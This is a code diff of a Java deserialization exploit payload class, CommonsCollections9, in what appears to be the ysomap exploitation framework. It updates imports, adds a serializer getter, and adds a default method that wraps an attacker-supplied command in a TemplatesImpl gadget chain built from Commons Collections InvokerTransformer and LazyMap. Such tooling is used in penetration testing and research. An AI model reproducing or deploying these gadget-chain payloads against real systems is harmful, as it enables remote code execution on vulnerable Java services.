@@ -4,12 +4,14 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
-import ysomap.PayloadTester;
+import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.TemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
+import ysomap.serializer.Serializer;
+import ysomap.serializer.SerializerFactory;
 import ysomap.util.Reflections;
 
 import java.lang.reflect.Field;
@@ -30,6 +32,11 @@ public class CommonsCollections9 extends Payload<HashSet> {
     @Override
     public boolean checkObject(Object obj) {
         return obj instanceof TemplatesImpl;
+    }
+
+    @Override
+    public Serializer<?> getSerializer() {
+        return SerializerFactory.createSerializer("");
     }
 
     @Override
@@ -79,6 +86,11 @@ public class CommonsCollections9 extends Payload<HashSet> {
         Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
 
         return map;
+    }
+
+    @Override
+    public ObjectGadget getDefaultBullet(String command) {
+        return new TemplatesImplBullet(command);
     }
 
     public static void main(String[] args) {
